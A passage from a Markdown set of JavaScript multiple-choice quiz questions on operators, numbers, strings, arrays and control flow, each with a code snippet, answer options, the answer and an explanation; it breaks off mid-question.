**Explanation:** `false && inc()` short-circuits — `inc()` is NOT called. `true || inc()` short-circuits — `inc()` is NOT called. `null ?? inc()` — `null` IS nullish, so `inc()` IS called and `count` becomes `1`. Only one actual call occurs.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `in` operator check in an object?

```javascript
const car = { make: 'Toyota', model: 'Corolla' };
console.log('make' in car);
console.log('price' in car);
console.log('toString' in car);
console.log('make' in Object.create(car));
```

- A) `true`, `false`, `false`, `false`
- B) `true`, `false`, `true`, `true`
- C) `true`, `false`, `true`, `false`
- D) `true`, `true`, `true`, `true`

**Answer: B) `true`, `false`, `true`, `true`**

**Explanation:** The `in` operator checks if a property exists on an object **or its prototype chain**. `"make"` is an own property → `true`. `"price"` doesn\'t exist → `false`. `"toString"` exists on `Object.prototype` → `true`. An object created with `Object.create(car)` inherits `car`\'s properties, so `"make" in child` is also `true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 4. Numbers

<br>

## Q. A developer needs to format a price to two decimal places. What is the output?

```javascript
let price = 19.5;
console.log(price.toFixed(2));
console.log(typeof price.toFixed(2));
```

- A) `19.50`, `"number"`
- B) `"19.50"`, `"string"`
- C) `19.5`, `"number"`
- D) `"19.5"`, `"string"`

**Answer: B) `"19.50"`, `"string"`**

**Explanation:** `.toFixed()` returns a **string**, not a number. This is a common source of bugs when developers expect a number back and then attempt arithmetic.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of this floating-point operation?

```javascript
console.log(0.1 + 0.2 === 0.3);
console.log(0.1 + 0.2);
```

- A) `true`, `0.3`
- B) `false`, `0.30000000000000004`
- C) `false`, `0.3`
- D) `true`, `0.30000000000000004`

**Answer: B) `false`, `0.30000000000000004`**

**Explanation:** JavaScript uses IEEE 754 floating-point arithmetic, which cannot represent some decimal fractions exactly. The result `0.1 + 0.2` is `0.30000000000000004`. Use `Number.EPSILON` for safe comparison: `Math.abs(0.1 + 0.2 - 0.3) < Number.EPSILON`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is `Number.MAX_SAFE_INTEGER` and what happens beyond it?

```javascript
console.log(Number.MAX_SAFE_INTEGER);
console.log(Number.MAX_SAFE_INTEGER + 1 === Number.MAX_SAFE_INTEGER + 2);
console.log(Number.isSafeInteger(Number.MAX_SAFE_INTEGER));
console.log(Number.isSafeInteger(Number.MAX_SAFE_INTEGER + 1));
```

- A) `9007199254740991`, `false`, `true`, `true`
- B) `9007199254740991`, `true`, `true`, `false`
- C) `9007199254740992`, `true`, `true`, `false`
- D) `9007199254740991`, `false`, `true`, `false`

**Answer: B) `9007199254740991`, `true`, `true`, `false`**

**Explanation:** `Number.MAX_SAFE_INTEGER` is `2^53 - 1 = 9007199254740991`. Beyond this value integers cannot be represented exactly. `MAX_SAFE_INTEGER + 1` equals `MAX_SAFE_INTEGER + 2` (they map to the same float), returning `true`. `Number.isSafeInteger()` returns `false` for the overflow value.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What do the `Math` rounding methods return for negative numbers?

```javascript
console.log(Math.round(4.5));
console.log(Math.round(-4.5));
console.log(Math.ceil(-4.1));
console.log(Math.floor(-4.1));
console.log(Math.trunc(-4.9));
```

- A) `5`, `-4`, `-4`, `-5`, `-4`
- B) `5`, `-5`, `-4`, `-5`, `-4`
- C) `5`, `-4`, `-5`, `-5`, `-5`
- D) `4`, `-5`, `-4`, `-4`, `-4`

**Answer: A) `5`, `-4`, `-4`, `-5`, `-4`**

**Explanation:** `Math.round(4.5)` → `5`. `Math.round(-4.5)` → `-4` (rounds toward +∞). `Math.ceil(-4.1)` → `-4` (rounds toward +∞). `Math.floor(-4.1)` → `-5` (rounds toward -∞). `Math.trunc(-4.9)` → `-4` (removes decimal part, rounds toward zero).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of arithmetic with `Infinity` and `NaN`?

```javascript
console.log(1 / 0);
console.log(-1 / 0);
console.log(Infinity - Infinity);
console.log(0 / 0);
console.log(isFinite(Infinity));
```

- A) `Infinity`, `-Infinity`, `0`, `NaN`, `false`
- B) `Infinity`, `-Infinity`, `NaN`, `NaN`, `false`
- C) `Error`, `-Error`, `0`, `NaN`, `false`
- D) `Infinity`, `-Infinity`, `Infinity`, `0`, `true`

**Answer: B) `Infinity`, `-Infinity`, `NaN`, `NaN`, `false`**

**Explanation:** Division by zero in JavaScript produces `Infinity` (not an error). `Infinity - Infinity` is an indeterminate form → `NaN`. `0/0` → `NaN`. `isFinite(Infinity)` → `false`. JavaScript arithmetic never throws for overflow or division by zero.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What do `Number.isInteger` and `Number.isFinite` return compared to global equivalents?

```javascript
console.log(Number.isInteger(5.0));
console.log(Number.isInteger(5.5));
console.log(Number.isFinite(1 / 0));
console.log(Number.isFinite(42));
console.log(isFinite('42'));
```

- A) `true`, `false`, `false`, `true`, `false`
- B) `true`, `false`, `false`, `true`, `true`
- C) `false`, `false`, `false`, `true`, `true`
- D) `true`, `false`, `true`, `true`, `true`

**Answer: B) `true`, `false`, `false`, `true`, `true`**

**Explanation:** `Number.isInteger(5.0)` → `true` (5.0 is mathematically an integer). `Number.isFinite(Infinity)` → `false`. `Number.isFinite(42)` → `true`. The global `isFinite('42')` → `true` because it **coerces** its argument to a number first, unlike `Number.isFinite` which strictly checks the type.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `parseInt` return for non-decimal strings with radix?

```javascript
console.log(parseInt('11', 2));
console.log(parseInt('ff', 16));
console.log(parseInt('077', 8));
console.log(parseInt('z', 36));
```

- A) `3`, `255`, `63`, `35`
- B) `11`, `255`, `77`, `35`
- C) `3`, `255`, `77`, `35`
- D) `3`, `15`, `63`, `26`

**Answer: A) `3`, `255`, `63`, `35`**

**Explanation:** `parseInt('11', 2)` converts binary `11` → decimal `3`. `parseInt('ff', 16)` converts hex `ff` → `255`. `parseInt('077', 8)` converts octal `077` → `63`. `parseInt('z', 36)` converts base-36 `z` → `35`. Always provide the radix parameter to avoid unexpected behavior.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of `Math` utility methods?

```javascript
console.log(Math.abs(-5));
console.log(Math.max(1, 3, 2));
console.log(Math.min(...[4, 2, 7]));
console.log(Math.pow(2, 8));
console.log(Math.sqrt(144));
```

- A) `5`, `3`, `2`, `256`, `12`
- B) `-5`, `3`, `2`, `256`, `12`
- C) `5`, `1`, `7`, `256`, `12`
- D) `5`, `3`, `4`, `256`, `144`

**Answer: A) `5`, `3`, `2`, `256`, `12`**

**Explanation:** `Math.abs(-5)` → `5`. `Math.max(1,3,2)` → `3`. `Math.min(...[4,2,7])` → `2` (spread expands the array into individual arguments). `Math.pow(2,8) = 256` (equivalent to `2**8`). `Math.sqrt(144) = 12`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `toPrecision` return versus `toFixed`?

```javascript
const n = 123.456;
console.log(n.toFixed(2));
console.log(n.toPrecision(5));
console.log(n.toPrecision(2));
console.log(typeof n.toFixed(2));
```

- A) `"123.46"`, `"123.46"`, `"1.2e+2"`, `"string"`
- B) `"123.46"`, `"123.46"`, `"120"`, `"number"`
- C) `"123.46"`, `"123.46"`, `"1.2e+2"`, `"number"`
- D) `123.46`, `123.46`, `120`, `"string"`

**Answer: A) `"123.46"`, `"123.46"`, `"1.2e+2"`, `"string"`**

**Explanation:** `toFixed(2)` formats to 2 decimal places → `"123.46"`. `toPrecision(5)` uses 5 significant digits → `"123.46"`. `toPrecision(2)` uses only 2 significant digits → `"1.2e+2"` (scientific notation). Both return **strings**, not numbers.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of `NaN` comparisons and detection?

```javascript
const x = NaN;
console.log(x === x);
console.log(x !== x);
console.log(Number.isNaN(x));
console.log(Number.isNaN('hello'));
console.log(isNaN('hello'));
```

- A) `false`, `true`, `true`, `false`, `true`
- B) `true`, `false`, `true`, `false`, `true`
- C) `false`, `true`, `true`, `true`, `true`
- D) `false`, `false`, `true`, `false`, `false`

**Answer: A) `false`, `true`, `true`, `false`, `true`**

**Explanation:** `NaN` is the only value not equal to itself. `x === x` → `false`, `x !== x` → `true` (idiomatic NaN check). `Number.isNaN(NaN)` → `true` (no coercion). `Number.isNaN('hello')` → `false` (it\'s a string, not NaN). Global `isNaN('hello')` → `true` (coerces `'hello'` to `NaN` first — misleading).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Math.random()` guarantee about its output?

```javascript
const values = Array.from({ length: 1000 }, () => Math.random());
const allInRange = values.every(v => v >= 0 && v < 1);
console.log(allInRange);
// To get random int 0-9:
const rand = Math.floor(Math.random() * 10);
```

- A) `false` — `Math.random()` can return `1`
- B) `true` — `Math.random()` returns values in `[0, 1)`: inclusive of 0, exclusive of 1
- C) `true` — `Math.random()` returns values in `(0, 1)`: exclusive of both ends
- D) `true` — `Math.random()` returns values in `[0, 1]`: inclusive of both ends

**Answer: B) `true` — `Math.random()` returns values in `[0, 1)`: inclusive of 0, exclusive of 1**

**Explanation:** `Math.random()` returns a pseudo-random float in `[0, 1)` — zero is possible but `1` is never returned. `Math.floor(Math.random() * 10)` produces integers from `0` to `9` uniformly. For cryptographic use, use `crypto.getRandomValues()` instead.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer formats numbers for display. What is the output?

```javascript
const price = 1234567.891;
console.log(price.toLocaleString('en-US'));
console.log(price.toLocaleString('en-US', {
  style: 'currency',
  currency: 'USD',
  minimumFractionDigits: 2,
  maximumFractionDigits: 2
}));
```

- A) `"1234567.891"`, `"USD 1234567.89"`
- B) `"1,234,567.891"`, `"$1,234,567.89"`
- C) `"1.234.567,891"`, `"$1,234,567.89"`
- D) `"1,234,567.891"`, `"1,234,567.89 USD"`

**Answer: B) `"1,234,567.891"`, `"$1,234,567.89"`**

**Explanation:** `toLocaleString('en-US')` formats with US locale conventions (comma thousands separator, dot decimal). The `currency` style adds the `$` symbol and applies the fraction digit constraints. Output may vary by environment, but this is the standard en-US format.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 5. String

<br>

## Q. A developer needs to extract a file extension. Which snippet correctly gets `"pdf"` from `"report.pdf"`?

```javascript
let filename = "report.pdf";
```

- A) `filename.slice(-3)`
- B) `filename.substring(filename.lastIndexOf(".") + 1)`
- C) `filename.split(".")[1]`
- D) All of the above

**Answer: D) All of the above**

**Explanation:** All three work for `"report.pdf"`: `.slice(-3)` gets the last 3 characters; `.lastIndexOf(".") + 1` finds the extension after the last dot; `.split(".")[1]` splits on dot and gets the second part. However, `.lastIndexOf` is most robust for filenames with multiple dots.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the following string operation produce?

```javascript
let str = "Hello, World!";
console.log(str.indexOf("World"));
console.log(str.includes("world"));
console.log(str.toLowerCase().includes("world"));
```

- A) `7`, `true`, `true`
- B) `7`, `false`, `true`
- C) `-1`, `false`, `true`
- D) `7`, `false`, `false`

**Answer: B) `7`, `false`, `true`**

**Explanation:** `.indexOf("World")` returns `7` (the index where `"World"` starts). `.includes()` is case-sensitive, so `"world"` is not found. After `.toLowerCase()`, `"world"` is found.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What do `padStart` and `padEnd` return?

```javascript
const num = '42';
console.log(num.padStart(5, '0'));
console.log(num.padEnd(5, '*'));
console.log('hello'.padStart(3));
```

- A) `"00042"`, `"42***"`, `"hello"`
- B) `"00042"`, `"42***"`, `"hel"`
- C) `"42000"`, `"***42"`, `"hello"`
- D) `"00042"`, `"42   "`, `"hello"`

**Answer: A) `"00042"`, `"42***"`, `"hello"`**

**Explanation:** `padStart(5, '0')` pads from the left to reach length 5 → `"00042"`. `padEnd(5, '*')` pads from the right → `"42***"`. If the string is already >= the target length, it is returned unchanged — `'hello'` has length 5, which is >= 3, so it is returned as-is.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `replaceAll` return compared to `replace`?

```javascript
const text = 'cat and cat and cat';
console.log(text.replace('cat', 'dog'));
console.log(text.replaceAll('cat', 'dog'));
console.log(text.replace(/cat/g, 'dog'));
```

- A) `"dog and cat and cat"`, `"dog and dog and dog"`, `"dog and cat and cat"`
- B) `"dog and cat and cat"`, `"dog and dog and dog"`, `"dog and dog and dog"`
- C) `"dog and dog and dog"`, `"dog and dog and dog"`, `"dog and dog and dog"`
- D) `"cat and cat and cat"`, `"dog and dog and dog"`, `"dog and dog and dog"`

**Answer: B) `"dog and cat and cat"`, `"dog and dog and dog"`, `"dog and dog and dog"`**

**Explanation:** `String.replace(string)` only replaces the **first** occurrence. `replaceAll(string)` replaces all occurrences (ES2021). `replace(/pattern/g)` with the global regex flag also replaces all. Both `replaceAll` and `replace` with `/g` produce the same result.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `split` return for these inputs?

```javascript
console.log('a,b,c'.split(','));
console.log('hello'.split(''));
console.log('a,,b'.split(','));
console.log('abc'.split('', 2));
```

- A) `["a","b","c"]`, `["h","e","l","l","o"]`, `["a","b"]`, `["a","b"]`
- B) `["a","b","c"]`, `["h","e","l","l","o"]`, `["a","","b"]`, `["a","b"]`
- C) `["a","b","c"]`, `["hello"]`, `["a","","b"]`, `["a","b"]`
- D) `["a,b,c"]`, `["h","e","l","l","o"]`, `["a","","b"]`, `["a","b","c"]`

**Answer: B) `["a","b","c"]`, `["h","e","l","l","o"]`, `["a","","b"]`, `["a","b"]`**

**Explanation:** `split(',')` splits on commas. `split('')` splits every character. `'a,,b'.split(',')` keeps the empty string between consecutive delimiters. The second argument to `split` is a limit on the number of results — `split('', 2)` returns only the first 2 characters.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. Are strings mutable in JavaScript?

```javascript
let str = 'hello';
str[0] = 'H';
console.log(str);
str = str.charAt(0).toUpperCase() + str.slice(1);
console.log(str);
```

- A) `"Hello"`, `"Hello"`
- B) `"hello"`, `"Hello"`
- C) `"Hello"`, `"hello"`
- D) `TypeError` — strings cannot be indexed

**Answer: B) `"hello"`, `"Hello"`**

**Explanation:** Strings are **immutable** in JavaScript. Assigning to `str[0]` silently fails (in non-strict mode) or throws in strict mode — the original string is unchanged. To transform a string, use methods that return new strings (like `toUpperCase()`, `slice()`, or `replace()`).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `repeat` method return?

```javascript
console.log('ab'.repeat(3));
console.log('x'.repeat(0));
console.log('-'.repeat(10));
```

- A) `"ababab"`, `""`, `"----------"`
- B) `"ababababababab"`, `"x"`, `"----------"`
- C) `"ababab"`, `undefined`, `"----------"`
- D) `"ab3"`, `""`, `"-10"`

**Answer: A) `"ababab"`, `""`, `"----------"`**

**Explanation:** `repeat(n)` returns a new string with the original repeated `n` times. `repeat(0)` returns an empty string. `repeat()` is useful for creating padding strings, separators, or test data without loops.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `at()` method return?

```javascript
const str = 'Hello';
console.log(str.at(0));
console.log(str.at(-1));
console.log(str.at(-2));
console.log(str.at(10));
```

- A) `"H"`, `"o"`, `"l"`, `undefined`
- B) `"H"`, `"H"`, `"e"`, `undefined`
- C) `"H"`, `undefined`, `"l"`, `undefined`
- D) `"H"`, `"o"`, `"l"`, `""`

**Answer: A) `"H"`, `"o"`, `"l"`, `undefined`**

**Explanation:** `at(0)` returns the first character. `at(-1)` returns the last character (index from end). `at(-2)` returns the second-to-last. `at(10)` returns `undefined` for out-of-range indices. `at()` is the modern alternative to `str[str.length - 1]` for negative indexing.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `startsWith` and `endsWith` return?

```javascript
const url = 'https://api.example.com/users';
console.log(url.startsWith('https'));
console.log(url.endsWith('/users'));
console.log(url.startsWith('api', 8));
console.log(url.includes('example'));
```

- A) `true`, `true`, `false`, `true`
- B) `true`, `true`, `true`, `true`
- C) `false`, `true`, `true`, `true`
- D) `true`, `false`, `true`, `true`

**Answer: B) `true`, `true`, `true`, `true`**

**Explanation:** `startsWith('https')` → `true`. `endsWith('/users')` → `true`. `startsWith('api', 8)` — the second argument is the start position, so it checks from index 8 where `'api'` begins → `true`. `includes('example')` → `true`. All these methods are case-sensitive.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What do `trimStart`, `trimEnd`, and `trim` return?

```javascript
const padded = '  hello world  ';
console.log(padded.trim().length);
console.log(padded.trimStart().endsWith('  '));
console.log(padded.trimEnd().startsWith('  '));
```

- A) `11`, `false`, `false`
- B) `11`, `true`, `true`
- C) `15`, `true`, `true`
- D) `11`, `true`, `false`

**Answer: B) `11`, `true`, `true`**

**Explanation:** `trim()` removes whitespace from both ends → `'hello world'` (length 11). `trimStart()` only removes leading whitespace → `'hello world  '` (still ends with `'  '` → `true`). `trimEnd()` only removes trailing whitespace → `'  hello world'` (still starts with `'  '` → `true`).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does string comparison with `localeCompare` return?

```javascript
console.log('apple'.localeCompare('banana'));
console.log('banana'.localeCompare('apple'));
console.log('apple'.localeCompare('apple'));
const fruits = ['banana', 'apple', 'cherry'];
console.log(fruits.sort((a, b) => a.localeCompare(b)));
```

- A) `-1`, `1`, `0`, `["apple","banana","cherry"]`
- B) `1`, `-1`, `0`, `["apple","banana","cherry"]`
- C) `-1`, `1`, `1`, `["banana","apple","cherry"]`
- D) `-1`, `1`, `0`, `["banana","apple","cherry"]`

**Answer: A) `-1`, `1`, `0`, `["apple","banana","cherry"]`**

**Explanation:** `localeCompare` returns negative if the string comes before the argument alphabetically, positive if after, and `0` if equal. It\'s the recommended way to sort strings because it handles locale-specific rules (accents, special characters) correctly.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `String.fromCharCode` and `charCodeAt` return?

```javascript
console.log('A'.charCodeAt(0));
console.log('a'.charCodeAt(0));
console.log(String.fromCharCode(72, 101, 108, 108, 111));
```

- A) `65`, `97`, `"Hello"`
- B) `65`, `97`, `"72101108108111"`
- C) `64`, `96`, `"Hello"`
- D) `65`, `97`, `"HELLO"`

**Answer: A) `65`, `97`, `"Hello"`**

**Explanation:** `'A'.charCodeAt(0)` → `65` (Unicode code point for uppercase A). `'a'.charCodeAt(0)` → `97` (lowercase a). `String.fromCharCode(72, 101, 108, 108, 111)` converts code points back to a string: H=72, e=101, l=108, l=108, o=111 → `"Hello"`. Useful for encoding/decoding ASCII data.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 6. Array

<br>

## Q. A developer manages a task queue. What is the output after these operations?

```javascript
let queue = ["task1", "task2", "task3"];
queue.push("task4");
let first = queue.shift();
console.log(first);
console.log(queue.length);
```

- A) `"task1"`, `3`
- B) `"task4"`, `3`
- C) `"task1"`, `4`
- D) `"task4"`, `4`

**Answer: A) `"task1"`, `3`**

**Explanation:** `.push()` adds `"task4"` to the end (array is now length 4). `.shift()` removes and returns the **first** element (`"task1"`), leaving 3 elements.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output?

```javascript
let nums = [1, 2, 3, 4, 5];
let sliced = nums.slice(1, 3);
let spliced = nums.splice(1, 2);
console.log(sliced);
console.log(spliced);
console.log(nums);
```

- A) `[2, 3]`, `[2, 3]`, `[1, 4, 5]`
- B) `[2, 3]`, `[2, 3]`, `[1, 2, 3, 4, 5]`
- C) `[1, 2, 3]`, `[2, 3]`, `[1, 4, 5]`
- D) `[2, 3]`, `[1, 2]`, `[3, 4, 5]`

**Answer: A) `[2, 3]`, `[2, 3]`, `[1, 4, 5]`**

**Explanation:** `.slice(1, 3)` returns elements at indices 1 and 2 (`[2, 3]`) **without** modifying the original. `.splice(1, 2)` removes 2 elements starting at index 1 (`[2, 3]`) and **modifies** the original array, leaving `[1, 4, 5]`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Array.from` return for these inputs?

```javascript
console.log(Array.from('hello'));
console.log(Array.from({ length: 3 }, (_, i) => i * 2));
console.log(Array.from(new Set([1, 2, 2, 3])));
```

- A) `["h","e","l","l","o"]`, `[0,2,4]`, `[1,2,3]`
- B) `["hello"]`, `[0,2,4]`, `[1,2,2,3]`
- C) `["h","e","l","l","o"]`, `[0,1,2]`, `[1,2,3]`
- D) `["h","e","l","l","o"]`, `[0,2,4]`, `[1,2,2,3]`

**Answer: A) `["h","e","l","l","o"]`, `[0,2,4]`, `[1,2,3]`**

**Explanation:** `Array.from('hello')` splits the string into characters. `Array.from({length:3}, fn)` creates an array of length 3 using the mapping function — `(_, i)` gives indices 0, 1, 2, doubled to `0, 2, 4`. `Array.from(new Set([...]))` converts a Set to an array, deduplicating values.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `find` return versus `findIndex`?

```javascript
const users = [
  { id: 1, name: 'Alice' },
  { id: 2, name: 'Bob' },
  { id: 3, name: 'Carol' }
];
console.log(users.find(u => u.id === 2));
console.log(users.findIndex(u => u.id === 2));
console.log(users.find(u => u.id === 99));
console.log(users.findIndex(u => u.id === 99));
```

- A) `{id:2,name:"Bob"}`, `1`, `null`, `-1`
- B) `{id:2,name:"Bob"}`, `1`, `undefined`, `-1`
- C) `{id:2,name:"Bob"}`, `2`, `undefined`, `-1`
- D) `2`, `1`, `undefined`, `-1`

**Answer: B) `{id:2,name:"Bob"}`, `1`, `undefined`, `-1`**

**Explanation:** `find()` returns the first matching element (or `undefined` if none). `findIndex()` returns the index of the first match (or `-1` if not found). Both stop iteration when a match is found. They accept a callback, unlike `indexOf()` which only checks strict equality.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `every` and `some` return?

```javascript
const nums = [2, 4, 6, 8, 9];
console.log(nums.every(n => n % 2 === 0));
console.log(nums.some(n => n % 2 !== 0));
console.log([].every(n => n > 100));
console.log([].some(n => n > 100));
```

- A) `false`, `true`, `false`, `false`
- B) `false`, `true`, `true`, `false`
- C) `true`, `true`, `true`, `false`
- D) `false`, `false`, `true`, `false`

**Answer: B) `false`, `true`, `true`, `false`**

**Explanation:** `every` returns `false` because `9` is odd. `some` returns `true` because `9` is odd. `[].every(fn)` returns `true` for empty arrays (vacuous truth — no elements fail the test). `[].some(fn)` returns `false` for empty arrays (no elements satisfy the condition).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `flatMap` return?

```javascript
const sentences = ['hello world', 'foo bar'];
const words = sentences.flatMap(s => s.split(' '));
console.log(words);
console.log([1, 2, 3].flatMap(x => [x, x * 2]));
```

- A) `[["hello","world"],["foo","bar"]]`, `[1,2,2,4,3,6]`
- B) `["hello","world","foo","bar"]`, `[1,2,2,4,3,6]`
- C) `["hello world","foo bar"]`, `[1,1,2,2,3,3]`
- D) `["hello","world","foo","bar"]`, `[2,4,6]`

**Answer: B) `["hello","world","foo","bar"]`, `[1,2,2,4,3,6]`**

**Explanation:** `flatMap(fn)` applies `fn` to each element and flattens the result by one level. It is equivalent to `.map(fn).flat(1)`. The first example maps each sentence to an array of words, then flattens. The second doubles each element inline.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Array.fill` do?

```javascript
const arr = new Array(5).fill(0);
console.log(arr);
const partial = [1, 2, 3, 4, 5];
partial.fill(0, 2, 4);
console.log(partial);
```

- A) `[0,0,0,0,0]`, `[1,2,0,0,5]`
- B) `[0,0,0,0,0]`, `[1,2,0,0,0]`
- C) `[undefined,undefined,undefined,undefined,undefined]`, `[1,2,0,0,5]`
- D) `[0,0,0,0,0]`, `[1,0,0,0,5]`

**Answer: A) `[0,0,0,0,0]`, `[1,2,0,0,5]`**

**Explanation:** `new Array(5).fill(0)` creates an array of 5 zeros. `fill(value, start, end)` fills from index `start` (inclusive) to `end` (exclusive). `fill(0, 2, 4)` fills indices 2 and 3 with `0`, leaving index 4 (`5`) unchanged. `fill` mutates the original array.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `includes` return versus `indexOf`?

```javascript
const arr = [1, NaN, null, undefined, 0];
console.log(arr.includes(NaN));
console.log(arr.indexOf(NaN));
console.log(arr.includes(null));
console.log(arr.indexOf(null));
```

- A) `true`, `-1`, `true`, `2`
- B) `false`, `-1`, `true`, `2`
- C) `true`, `-1`, `false`, `-1`
- D) `true`, `2`, `true`, `2`

**Answer: A) `true`, `-1`, `true`, `2`**

**Explanation:** `includes()` uses the SameValueZero algorithm — it correctly finds `NaN` (unlike `NaN === NaN` which is false). `indexOf()` uses strict equality (`===`), so it cannot find `NaN` → returns `-1`. Both find `null` at index 2.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does array destructuring with rest produce?

```javascript
const [first, second, ...rest] = [1, 2, 3, 4, 5];
console.log(first);
console.log(second);
console.log(rest);
const [a, , b] = [10, 20, 30];
console.log(a, b);
```

- A) `1`, `2`, `[3,4,5]`, `10 20`
- B) `1`, `2`, `[3,4,5]`, `10 30`
- C) `1`, `2`, `3`, `10 30`
- D) `1`, `2`, `[3,4,5]`, `10 undefined`

**Answer: B) `1`, `2`, `[3,4,5]`, `10 30`**

**Explanation:** Rest syntax `...rest` collects all remaining elements into an array. Skipping elements with `, ,` (empty slot) jumps over the value at that position — so `a = 10` and `b = 30` (index 2), skipping `20` (index 1).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does `sort` work with numbers?

```javascript
const nums = [10, 1, 21, 2];
console.log(nums.sort());
console.log([10, 1, 21, 2].sort((a, b) => a - b));
console.log([10, 1, 21, 2].sort((a, b) => b - a));
```

- A) `[1,2,10,21]`, `[1,2,10,21]`, `[21,10,2,1]`
- B) `[1,10,2,21]`, `[1,2,10,21]`, `[21,10,2,1]`
- C) `[10,1,21,2]`, `[1,2,10,21]`, `[21,10,2,1]`
- D) `[1,2,10,21]`, `[1,2,10,21]`, `[2,1,21,10]`

**Answer: B) `[1,10,2,21]`, `[1,2,10,21]`, `[21,10,2,1]`**

**Explanation:** Default `sort()` converts elements to strings and sorts lexicographically — `"10" < "2"` because `"1" < "2"` as a string! Always provide a comparator for numeric sorting: `(a, b) => a - b` for ascending, `(a, b) => b - a` for descending.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `reduceRight` return?

```javascript
const result = [[1, 2], [3, 4], [5, 6]]
  .reduceRight((acc, arr) => acc.concat(arr), []);
console.log(result);
```

- A) `[1,2,3,4,5,6]`
- B) `[5,6,3,4,1,2]`
- C) `[6,5,4,3,2,1]`
- D) `[[5,6],[3,4],[1,2]]`

**Answer: B) `[5,6,3,4,1,2]`**

**Explanation:** `reduceRight` processes elements from right to left. Starting with `[]`: concat `[5,6]` → `[5,6]`, concat `[3,4]` → `[5,6,3,4]`, concat `[1,2]` → `[5,6,3,4,1,2]`. Compare with `reduce` (left-to-right) which would produce `[1,2,3,4,5,6]`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Array.of` return versus `new Array`?

```javascript
console.log(Array.of(3));
console.log(new Array(3));
console.log(Array.of(1, 2, 3));
console.log(new Array(1, 2, 3));
```

- A) `[3]`, `[3]`, `[1,2,3]`, `[1,2,3]`
- B) `[3]`, `[,,]`, `[1,2,3]`, `[1,2,3]`
- C) `[undefined,undefined,undefined]`, `[,,]`, `[1,2,3]`, `[1,2,3]`
- D) `[3]`, `[undefined,undefined,undefined]`, `[1,2,3]`, `[1,2,3]`

**Answer: B) `[3]`, `[,,]`, `[1,2,3]`, `[1,2,3]`**

**Explanation:** `Array.of(3)` creates an array with one element `3`. `new Array(3)` creates a sparse array with 3 **empty** slots (a classic gotcha). `Array.of(1,2,3)` and `new Array(1,2,3)` are equivalent. Use `Array.of()` when you need reliable single-element arrays.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 7. Control Flow

<br>

## Q. What is the output of this loop?

```javascript
for (var i = 0; i < 3; i++) {
  if (i === 1) continue;
  console.log(i);
}
```

- A) `0`, `1`, `2`
- B) `0`, `2`
- C) `1`
- D) `0`

**Answer: B) `0`, `2`**

**Explanation:** `continue` skips the current iteration when `i === 1`, so `1` is never logged. The loop runs for `i = 0`, skips `i = 1`, runs for `i = 2`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer writes a switch statement. What is logged?

```javascript
let day = 2;
switch (day) {
  case 1:
    console.log("Monday");
  case 2:
    console.log("Tuesday");
  case 3:
    console.log("Wednesday");
    break;
  default:
    console.log("Unknown");
}
```

- A) `"Tuesday"`
- B) `"Tuesday"`, `"Wednesday"`
- C) `"Tuesday"`, `"Wednesday"`, `"Unknown"`
- D) `"Monday"`, `"Tuesday"`, `"Wednesday"`

**Answer: B) `"Tuesday"`, `"Wednesday"`**

**Explanation:** Without a `break` after `case 2`, execution "falls through" to `case 3`. The `break` in `case 3` stops further execution. This is a common JavaScript gotcha.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of a `do...while` loop?

```javascript
let i = 5;
do {
  console.log(i);
